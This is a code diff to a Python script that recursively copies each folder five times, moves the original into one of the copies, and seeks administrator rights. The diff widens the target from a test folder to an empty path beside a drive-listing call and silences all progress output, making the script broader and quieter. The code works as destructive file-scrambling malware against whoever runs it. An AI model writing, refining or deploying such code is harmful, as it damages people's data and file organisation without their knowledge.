@@ -14,7 +14,8 @@ import sys
 #redo 
 
 def main():
-    PATH = 'E:/Abb/'
+    #"E:/Abb/"
+    PATH = ''
     drives = list_drives()
     #for drive in drives:
         #PATH += drive
@@ -45,12 +46,16 @@ def file_cruser(PATH):
         for folder in folders:
             newPATH = PATH
             newPATH += '/' + folder
-            print("Currently in:\n",newPATH)
+            #print("Currently in:\n",newPATH)
             file_cruser(newPATH)
-            try:
-                Duplicate(PATH,folder)
-            except Exception as e:
-                print(f"Couldn't duplicate the tree:{e}")
+            NextFolders = list_file(newPATH)
+            if len(NextFolders) > 0:
+                try:
+                    Duplicate(PATH,folder)
+                except Exception as e:
+                    print(f"Couldn't duplicate the tree:{e}")
+            else:
+                pass
 
     else:
         newPathList = PATH.rsplit('/',1)
@@ -62,8 +67,12 @@ def file_cruser(PATH):
             print(f"Couldn't duplicate the folder:{e}")
 
 def Duplicate(PATH,Name):
-    print("Duplicated:",PATH,f"({Name})")
-    os.chdir(PATH)
+    #print("Duplicated:",PATH,f"({Name})")
+    try:
+        os.chdir(PATH)
+    except Exception as e:
+        print(e)
+        input("Press Enter to exit...")
     
     duplicates = 5
     for i in range(duplicates):
@@ -74,7 +83,7 @@ def Duplicate(PATH,Name):
             pass
 
     duplicatedFolders = [folder for folder in os.listdir(PATH) if Name in folder]
-    print(duplicatedFolders)
+    #print(duplicatedFolders)
     
     max = len(duplicatedFolders) - 1
     if max > 1:
@@ -82,12 +91,8 @@ def Duplicate(PATH,Name):
         src = PATH + '/' + Name
         dest = PATH + '/' + duplicatedFolders[index] + '/'
         destination = shutil.move(src,dest)
-        print(f"Moved to:{duplicatedFolders[index]}")
     else:
         pass
-
-def duplicate(PATH,folder):
-    print("Duplicated:\n",PATH,f"({folder})")
 
 def is_admin():
     try:
@@ -95,7 +100,7 @@ def is_admin():
     except:
         return False
 
-def Main():
+if __name__ == "__main__":
     if is_admin():
         try:
             main()
@@ -113,11 +118,4 @@ def Main():
             input("Press Enter to exit...")
         except Exception as e:
             print(f"Failed to elvavate to admin previlages: {e}")
-            input("Press Enter to exit...")
-
-try:
-            main()
-            input("Press Enter to exit...")
-except Exception as e:
-            print(f"An error occurred: {e}")
             input("Press Enter to exit...")
